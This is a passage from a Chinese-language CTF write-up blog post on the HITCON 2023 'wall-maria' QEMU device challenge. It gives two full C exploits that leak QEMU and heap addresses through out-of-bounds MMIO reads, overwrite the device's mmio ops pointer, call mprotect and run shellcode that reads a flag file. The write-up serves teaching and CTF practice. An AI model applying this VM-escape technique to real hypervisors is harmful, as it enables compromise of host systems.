class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PLT 0x60a0</span></span><br><span class="line"><span class="comment">// #define MARIO_READ 0x425277</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 0x2000</span></span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmio+addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;[+] page = %lx&quot;,page);</span></span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint64_t</span> src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x04</span>,src);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">uint8_t</span> off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x08</span>,(<span class="keyword">uint64_t</span> )off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">get_src</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mmio_read(<span class="number">0x04</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">get_off</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mmio_read(<span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_from_buff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_read(<span class="number">0x00</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_to_buff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x00</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0x00000000febd0000</span>);</span><br><span class="line">    <span class="comment">// void* tmp_buff = mmap(NULL,BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line">    <span class="keyword">char</span> leak[BUFF_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(leak,<span class="number">0</span>,BUFF_SIZE);</span><br><span class="line">    <span class="comment">// printf(&quot;[+] %lx&quot;,get_src());</span></span><br><span class="line">    <span class="keyword">uint64_t</span> change_addr = gva2gpa(leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the phy add of tmp_buff is %lx\n&quot;</span>,change_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the phy add of tmp_buff+0x1000 is %lx\n&quot;</span>,gva2gpa((<span class="keyword">void</span>*)(leak+<span class="number">0x1000</span>)));</span><br><span class="line">    set_src(change_addr);</span><br><span class="line">    set_off((<span class="keyword">uint8_t</span>)<span class="number">0xf0</span>);</span><br><span class="line">    read_from_buff();</span><br><span class="line"></span><br><span class="line">    set_src(change_addr+BUFF_SIZE<span class="number">-0xf0</span>);</span><br><span class="line">    set_off((<span class="keyword">uint8_t</span>)<span class="number">0</span>);</span><br><span class="line">    read_to_buff();</span><br><span class="line">    <span class="comment">//泄露基址</span></span><br><span class="line">    set_src(change_addr);</span><br><span class="line">    read_from_buff();</span><br><span class="line">    <span class="keyword">uint64_t</span> offset = *((<span class="keyword">uint64_t</span>*)leak +<span class="number">17</span>)<span class="number">-0x517ae0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *((<span class="keyword">uint64_t</span>*)leak) <span class="number">-0x123ad0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the leak base is %lx\n&quot;</span>,offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the heap base is %lx\n&quot;</span>,heap_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = offset+SYSTEM_PLT;</span><br><span class="line">    <span class="keyword">uint64_t</span> State_addr = heap_base+<span class="number">0x1076f00</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the State_addr is %lx\n&quot;</span>,State_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the system_addr is %lx\n&quot;</span>,system_addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原理就是首先把越界内容读到<code>change_addr</code>也就是leak对应的物理内存，然后把溢出部分再写回到buff，之后再将这溢出部分写到<code>change_addr</code>。实际上就是通过布局来将溢出的部分给提到前面去，然后再赋给<code>change_addr</code> (当然前面说过这样做很容易出问题，因为非法写了一部分物理内存)</p>
<p>之后就是越界写ops之类的操作了。因为我比赛中没看到沙盒所以一直打的<code>system</code>，实际上如果打ORW的话应该需要使用<code>mprotect</code>对内存区域的权限进行修改</p>
<p>因为我们调用<code>mmio_read/mmio_write</code>的时候，参数依次为<code>void *opaque, hwaddr addr, unsigned size</code>,后两个参数实际上是我们可控的，第一个参数我们也能通过控制结构体中的opaque来控制，所以就能对任意内存权限进行修改。</p>
<p>执行完之后</p>
<p><img src="https://s2.loli.net/2023/09/13/iGEHOJpnRau4wFl.png" alt="image-20230913201631192"></p>
<p>一个指向了我们的shellcode，一个指向了mprotect@plt。换言之mmio_write对应的mprotect，mmio_read对应了shellcode</p>
<p><img src="https://s2.loli.net/2023/09/13/hYoz9kCuLSlEX1Z.png" alt="image-20230913201707561"></p>
<p>使用huge page还有一个好处是我们写回buff的时候只需要对需要的地方进行更改，其他地方实际上就是我们复制来的内容，完全不需要更改。如果使用布局来搞的话还得自己恢复一下相应内容，或者计算偏移从前多少物理内存开始复制</p>
<p>完整exp如下，参见(<a target="_blank" rel="noopener" href="https://github.com/wxrdnx/HITCON-2023-Challenges/tree/main/wall-maria/solution">HITCON-2023-Challenges/wall-maria/solution at main · wxrdnx/HITCON-2023-Challenges (github.com)</a>) </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span> *)(mmio_mem + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x04</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x08</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_buff</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mmio_read(<span class="number">0x00</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_buff</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x00</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] open error in gva2gpa\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd, ((<span class="keyword">uint64_t</span>)addr / PAGE_SIZE) * <span class="number">8</span>, SEEK_SET);</span><br><span class="line">    read(fd, &amp;page, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) * PAGE_SIZE) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:05.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] Cannot open /sys/devices/pci0000:00/0000:00:05.0/resource0\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">4</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] mmio error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mmio done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set huge page</span></span><br><span class="line">    system(<span class="string">&quot;sysctl vm.nr_hugepages=32&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /proc/meminfo | grep -i huge&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buff;</span><br><span class="line">    <span class="keyword">uint64_t</span> buff_gpa;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        buff = mmap(<span class="number">0</span>, <span class="number">2</span> * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_NONBLOCK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (buff &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] cannot mmap buff\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="number">2</span> * PAGE_SIZE);</span><br><span class="line">        buff_gpa = gva2gpa(buff);</span><br><span class="line">        <span class="keyword">uint64_t</span> buff_gpa_1000 = gva2gpa(buff + PAGE_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (buff_gpa + PAGE_SIZE == buff_gpa_1000) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] buff virtual address = %p\n&quot;</span>, buff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] buff physical address = %p\n&quot;</span>, buff_gpa);</span><br><span class="line">    </span><br><span class="line">    set_src(buff_gpa);</span><br><span class="line">    set_off(<span class="number">0xf0</span>);</span><br><span class="line">    get_buff();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *buff_u64 = (<span class="keyword">uint64_t</span> *)buff;</span><br><span class="line">    <span class="keyword">uint64_t</span> maria_buff_addr = buff_u64[<span class="number">0x3fa</span>] - <span class="number">0x20b8</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> maria_addr = maria_buff_addr - <span class="number">0xa30</span>;</span><br><span class="line">    <span class="comment">//uint64_t qemu_base = buff_u64[0x3eb] - 0xfc26a0;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_base = buff_u64[<span class="number">0x3eb</span>] - <span class="number">0xf1ff80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//uint64_t mprotect_plt = qemu_base + 0x31f880;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> mprotect_plt = qemu_base + <span class="number">0x30c400</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] maria-&gt;buff address = %p\n&quot;</span>, maria_buff_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] maria address = %p\n&quot;</span>, maria_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] qemu base address = %p\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mprotect@plt address = %p\n&quot;</span>, mprotect_plt);</span><br><span class="line"></span><br><span class="line">    buff_u64[<span class="number">0x0</span>] = maria_buff_addr + <span class="number">0x4f0</span>;</span><br><span class="line">    <span class="comment">//buff_u64[0x0] = 0xdeadbeefcafebabe;</span></span><br><span class="line">    buff_u64[<span class="number">0x1</span>] = mprotect_plt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* shellcode */</span></span><br><span class="line">    <span class="keyword">char</span> shellcode[] = &#123;</span><br><span class="line">        <span class="number">0xeb</span>, <span class="number">0x10</span>, <span class="number">0x2f</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>,</span><br><span class="line">        <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x3d</span>,</span><br><span class="line">        <span class="number">0xe6</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x6a</span>, <span class="number">0x70</span>, <span class="number">0x5a</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x92</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x58</span>,</span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x3c</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buff_u64[<span class="number">0x80</span>], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite maria-&gt;mmio.ops and maria-&gt;mmio.opaque */</span></span><br><span class="line">    buff_u64[<span class="number">0x3ec</span>] = maria_buff_addr &amp; ~<span class="number">0xfff</span>;             <span class="comment">// maria-&gt;mmio.opaque</span></span><br><span class="line">    buff_u64[<span class="number">0x3eb</span>] = maria_buff_addr + <span class="number">0xf0</span>;               <span class="comment">// maria-&gt;mmio.ops</span></span><br><span class="line">    <span class="comment">//buff_u64[0x3eb - (maria_addr &amp; 0xfff) / 8] = maria_buff_addr + 0xf0;// (MariaState *)(maria_addr &amp; 0xfff)-&gt;mmio.ops 没要搞懂这里是要干什么，但是去掉也能跑得通</span></span><br><span class="line"></span><br><span class="line">    set_src(buff_gpa);</span><br><span class="line">    set_off(<span class="number">0xf0</span>);</span><br><span class="line">    set_buff();</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x2000</span>, <span class="number">0x7</span>);</span><br><span class="line">    mmio_read(<span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Photon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://phot0n.com/2023/09/11/HITCONCTF-2023/">http://phot0n.com/2023/09/11/HITCONCTF-2023/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/re/">re</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/17/10%E6%9C%8817%E6%97%A5%E9%9A%8F%E7%AC%94/"><img class="prev-cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">10月17日随笔</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/"><img class="next-cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">WriteUps for some problems in SekaiCTF-2023</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/01/02/CatCTF2022/" title="CatCTF2022"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-02</div><div class="title">CatCTF2022</div></div></a></div><div><a href="/2022/03/29/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-29</div><div class="title">栈迁移</div></div></a></div><div><a href="/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/" title="WriteUps for some problems in SekaiCTF-2023"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-29</div><div class="title">WriteUps for some problems in SekaiCTF-2023</div></div></a></div><div><a href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-19</div><div class="title">CVE-2016-9793分析</div></div></a></div><div><a href="/2023/04/08/QEMU-RUN/" title="QEMU逃逸入门"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">QEMU逃逸入门</div></div></a></div><div><a href="/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/" title="libc的源码调试与分析"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-31</div><div class="title">libc的源码调试与分析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/01/19/K4TwFgDxsJ62tEo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Photon</div><div class="author-info__description">光子</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">62</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">41</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/photonwork"><i class="fab 